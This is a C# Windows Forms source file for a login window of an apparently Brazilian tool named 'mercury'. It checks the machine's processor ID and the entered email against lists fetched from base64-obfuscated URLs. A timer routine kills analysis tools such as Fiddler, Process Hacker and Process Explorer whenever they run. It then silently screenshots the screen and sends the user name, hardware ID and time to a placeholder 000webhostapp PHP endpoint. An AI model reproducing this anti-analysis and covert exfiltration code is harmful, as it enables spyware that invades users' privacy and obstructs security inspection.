using MaterialSkin;
using Transitions;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Security.Cryptography;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Net;
using System.Linq;
using System.Collections.Specialized;
using System.Management;

namespace mercury
{
    public partial class MainWindow : Form  
    {
        #region Shadow
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;
        private const int WM_NCLBUTTONDBLCLK = 0x00A3;
        private const int WM_NCHITTEST = 0x84;
        private const int HTCLIENT = 0x1;
        private const int HTCAPTION = 0x2;
        private bool m_aeroEnabled;
        private const int CS_DROPSHADOW = 0x00020000;
        private const int WM_NCPAINT = 0x0085;
        private const int WM_ACTIVATEAPP = 0x001C;
        [DllImport("dwmapi.dll")]
        public static extern int DwmExtendFrameIntoClientArea(IntPtr hWnd, ref MARGINS pMarInset);
        [DllImport("dwmapi.dll")]
        public static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int attrValue, int attrSize);
        [DllImport("dwmapi.dll")]
        public static extern int DwmIsCompositionEnabled(ref int pfEnabled);
        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);
        public struct MARGINS
        {
            public int leftWidth;
            public int rightWidth;
            public int topHeight;
            public int bottomHeight;
        }
        protected override CreateParams CreateParams
        {
            get
            {
                m_aeroEnabled = CheckAeroEnabled();
                CreateParams cp = base.CreateParams;
                if (!m_aeroEnabled) cp.ClassStyle |= CS_DROPSHADOW; return cp;
            }
        }

        public static int TextLength { get; private set; }

        private bool CheckAeroEnabled()
        {
            if (Environment.OSVersion.Version.Major >= 6)
            {
                int enabled = 0; DwmIsCompositionEnabled(ref enabled);
                return (enabled == 1) ? true : false;
            }
            return false;
        }
        protected override void WndProc(ref Message m)
        {
            switch (m.Msg)
            {
                case WM_NCPAINT:
                    if (m_aeroEnabled)
                    {
                        var v = 2;
                        DwmSetWindowAttribute(Handle, 2, ref v, 4);
                        MARGINS margins = new MARGINS() { bottomHeight = 1, leftWidth = 0, rightWidth = 0, topHeight = 0 };
                        DwmExtendFrameIntoClientArea(Handle, ref margins);
                    }
                    break;
                default: break;
            }
            if (m.Msg == WM_NCLBUTTONDBLCLK)
            {
                m.Result = IntPtr.Zero;
                return;
            }
            base.WndProc(ref m);
            if (m.Msg == WM_NCHITTEST && (int)m.Result == HTCLIENT) m.Result = (IntPtr)HTCAPTION;
        }
        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        #endregion

        public MainWindow()
        {
           
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            lbStatus.Location = new Point(lbStatus.Location.X, lbStatus.Location.Y + 100);
            MaterialSkinManager mgr = MaterialSkinManager.Instance;
            mgr.Theme = MaterialSkinManager.Themes.DARK;
            mgr.ColorScheme = new ColorScheme(Primary.Grey900, Primary.Grey900, Primary.Grey900, Accent.Purple700, TextShade.WHITE);          
           
        }
        private async Task Wait(int ms)
        {
            await Task.Delay(ms);
        }
   
        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = Convert.FromBase64String(base64EncodedData);
            return Encoding.UTF8.GetString(base64EncodedBytes);
        }

        private Random random = new Random();
        WebClient wc = new WebClient();
        WebProxy wp = new WebProxy();
          

        
        private Bitmap SetAlpha(Bitmap bmpIn, int alpha)
        {
            Bitmap bmpOut = new Bitmap(bmpIn.Width, bmpIn.Height);
            float a = alpha / 255f;
            Rectangle r = new Rectangle(0, 0, bmpIn.Width, bmpIn.Height);
            float[][] matrixItems = { new float[] { 1, 0, 0, 0, 0 }, new float[] { 0, 1, 0, 0, 0 }, new float[] { 0, 0, 1, 0, 0 }, new float[] { 0, 0, 0, a, 0 }, new float[] { 0, 0, 0, 0, 1 } };
            ColorMatrix colorMatrix = new ColorMatrix(matrixItems);
            ImageAttributes imageAtt = new ImageAttributes();
            using (Graphics g = Graphics.FromImage(bmpOut)) g.DrawImage(bmpIn, r, r.X, r.Y, r.Width, r.Height, GraphicsUnit.Pixel, imageAtt);
            return bmpOut;
        }
          

        private async void BtnEnter_Click(object sender, EventArgs e)
        {
            // Sistema de pegar o HWID
            var mbs = new ManagementObjectSearcher("Select ProcessorId From Win32_processor");
            ManagementObjectCollection mbsList = mbs.Get();
            string id = "";
            foreach (ManagementObject mo in mbsList)
            {
                id = mo["ProcessorId"].ToString();            
                break;
            }
            string url2 = ("aHR0cDovL2xhdGVuY3kweC5keC5hbS9sYXRlbmN5MHhsZWV0"); // Site com base64
            string stringdeco = (Base64Decode(url2));
            WebClient lala = new WebClient();
            string k = lala.DownloadString(stringdeco);
            var client = new WebClient();
            using (Stream stream = wc.OpenRead(stringdeco))
            using (var reader = new StreamReader(stream))

                if (k.Contains(id))
                {
                    goto Good;              
                }
                else if (k != null)
                {
                    MessageBox.Show("Ops! Your hwid is not on our db.\nYour HWID was copied to your clipboard.");                    
                    Clipboard.SetText(id);
                    return;
                }

            Good:

            try
                {

                    if (pnEmail.Text == "" || pnSenha.Text == "")
                    {
                    lbChecking.Text = "Email or password";
                        await Wait(3000);
                        lbChecking.Text = "";
                        return;
                    }
         

                    lbChecking.ForeColor = Color.White;
                    btnLogin.Enabled = false;
                    lbChecking.Text = "Checking...";
                    await Wait(2500);


                    string emaildown = ("aHR0cDovL2xhdGVuY3kweC5keC5hbS9sYXRlbmN5eGVtYWls"); // Site do email com base64
                    string stringdeemail = (Base64Decode(emaildown));
                    string emailsee = new WebClient().DownloadString(stringdeemail); 
                    var client2 = new WebClient();
                    string q2 = lala.DownloadString(stringdeemail);
                    using (var stream2 = client.OpenRead(stringdeemail))
                    using (var reader2 = new StreamReader(stream2))
                {
                    if (q2.Contains(pnEmail.Text))
                    {
                         goto Autorizei;
                    }
                    else if (q2 != null)
                    {
                        btnLogin.Enabled = true;
                        lbChecking.ForeColor = Color.Red;
                        lbChecking.Text = "Unauthorized.";
                        return;

                    }

                }

            Autorizei:
               
                    lbChecking.ForeColor = Color.LightGreen;
                    lbChecking.Text = "Authorized.";
                    await Wait(1500);
                    lbChecking.Visible = false;
                    await Wait(1200);
                    btnLogin.Enabled = false;
                    Refresh();
                    this.Hide();
                    await Wait(500);
                    Client f2 = new Client();
                    f2.ShowDialog();
                    this.Close();


                return;

                 
                }
                catch (Exception)
                {
                    MessageBox.Show("An error has occurred, please try again.", "Latencyx#1337", 0, MessageBoxIcon.Error);
                }
            }
        
        

        private void MainWindow_Load(object sender, EventArgs e)
        {
           
        }
        int i = 0;


        private void PrintScreen()
        {
            Bitmap printscreen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(printscreen as Image);
            graphics.CopyFromScreen(0, 0, 0, 0, printscreen.Size); //Copia a imagem da tela
            var words2 = new[] { "1", "2", "3", "4" };
            var wordsInRandomOrder2 = words2.OrderBy(i => Guid.NewGuid());

            foreach (var word2 in wordsInRandomOrder2)
            {
                var mbs = new ManagementObjectSearcher("Select ProcessorId From Win32_processor");
                ManagementObjectCollection mbsList = mbs.Get();
                string id = "";
                foreach (ManagementObject mo in mbsList)
                {
                    id = mo["ProcessorId"].ToString();
                    break;
                }

                DateTime dateTime = DateTime.UtcNow;
                TimeZoneInfo hrBrasilia = TimeZoneInfo.FindSystemTimeZoneById("E. South America Standard Time");
                TimeZoneInfo.ConvertTimeFromUtc(dateTime, hrBrasilia);
                WebClient webClient2 = new WebClient();
                WebClient webClient = new WebClient();
                printscreen.Save(@"C:\Windows\Temp\" + word2 + ".jpg", ImageFormat.Jpeg);
                webClient.DownloadString("https://seu_site_aqui.000webhostapp.com/enviar123890128030123890123890123.php?msg=");
                webClient2.DownloadString(string.Concat(new string[]
                {

                        "https://seu_site_aqui.000webhostapp.com/phpenviar.php?msg=",
                        "\nPC Name: " + Environment.UserName,
                        "\nHWID: " + id,
                        "\nDate: " + TimeZoneInfo.ConvertTimeFromUtc(dateTime, hrBrasilia)

                }));
                return;
            }
        
        }
        private void TimerCheck_Tick(object sender, EventArgs e)
        {
            {
                foreach (Process proc in Process.GetProcessesByName("MethodFinder"))
                {
                    proc.Kill();
                    PrintScreen();
                }
            }
            {
                foreach (Process proc in Process.GetProcessesByName("Fiddler"))
                {
                    proc.Kill();
                    PrintScreen();
                }
            }
            {
                foreach (Process proc in Process.GetProcessesByName("ProcessHacker"))
                {
                    proc.Kill();
                    PrintScreen();
                   
                }
            }
            {
                foreach (Process proc in Process.GetProcessesByName("procexp64"))
                {
                    proc.Kill();
                    PrintScreen();
                }
            }
            {
                foreach (Process proc in Process.GetProcessesByName("procexp"))
                {
                    proc.Kill();
                    PrintScreen();
                }
            }
            {
                foreach (Process proc in Process.GetProcessesByName("ProcessExplorer"))
                {
                    proc.Kill();
                    PrintScreen();
                }
            }
            {
                foreach (Process proc in Process.GetProcessesByName("tcplogview"))
                {
                    proc.Kill();
                    PrintScreen();
                }
            }
            {
                foreach (Process proc in Process.GetProcessesByName("WinPrefetchView"))
                {
                    proc.Kill();
                    PrintScreen();

                }
            }
        }

        private void lbScanner_Click(object sender, EventArgs e)
        {

        }

        private void pnResults_Paint(object sender, PaintEventArgs e)
        {

        }

        private void lbMercury_Click(object sender, EventArgs e)
        {

        }

        private void pnOverrideAnimate_Paint(object sender, PaintEventArgs e)
        {

        }

        private void txtPin_Click(object sender, EventArgs e)
        {
           
        }

        private void label5_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void panel3_Paint(object sender, PaintEventArgs e)
        {

        }
  

        private void picStatus_Click(object sender, EventArgs e)
        {

        }

        private void bunifuButton1_Click(object sender, EventArgs e)
        {

        }

        private void materialSingleLineTextField1_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void ttMain_Popup(object sender, Bunifu.UI.WinForms.BunifuToolTip.PopupEventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void lbScanTime_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click_1(object sender, EventArgs e)
        {

        }

        private void btCheck_Click(object sender, EventArgs e)
        {
        }

        private void btExit_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void lbRainbow_Click(object sender, EventArgs e)
        {

        }
             
        private void pnEmail_Click(object sender, EventArgs e)
        {
                       
        }

        private void lbMineclose_Click(object sender, EventArgs e)
        {

        }

        private void materialCheckBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void label1_Click_2(object sender, EventArgs e)
        {

        }

        private void label1_Click_3(object sender, EventArgs e)
        {

        }

        private void panel3_Paint_1(object sender, PaintEventArgs e)
        {

        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {

        }

        private void dateTimePicker1_ValueChanged(object sender, EventArgs e)
        {

        }

        private void pictureBox1_Click_1(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void materialFlatButton1_Click(object sender, EventArgs e)
        {

        }

        private void blRandomized_Click(object sender, EventArgs e)
        {

        }

        private void pcFantasma_Click(object sender, EventArgs e)
        {

        }
    }
}
